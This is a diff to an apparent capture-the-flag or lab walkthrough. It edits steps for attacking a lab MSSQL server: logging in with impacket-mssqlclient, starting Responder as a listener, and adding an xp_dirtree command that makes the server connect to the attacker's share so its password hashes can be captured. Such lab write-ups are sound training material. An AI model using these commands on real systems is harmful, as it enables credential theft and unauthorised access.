@@ -79,15 +79,19 @@ Before you move forward with this section we will need a few tools
 the first thing we will be doing is getting 2 terminal windows open. Please pay attention because we will be jumping between the 2 throughout this section.
 We will track which we are in with one terminal being labeled "Term 1" and the other being "Term 2".
 
-Term 1: Log into the system with the following command
+Term 1: Log into the system with the following command:
 impacket-mssqlclient reporting:@10.129.156.234 -windows-auth
 
-Next Switch to Term 2:
+Term 2:
 Use the following command to setup our listener:
 
 responder -I [YOUR INTERFACE CONNECTED TO THE NETWORK WITH THE VULNERABLE BOX]
 
 Information can be found using "ip addr show"
+
+Term 1:
+Next we will send the hashes from the SQL Service with the following command:
+xp_dirtree '\\[YOUR LOCAL IP]\share\file'
 
 </details>
 
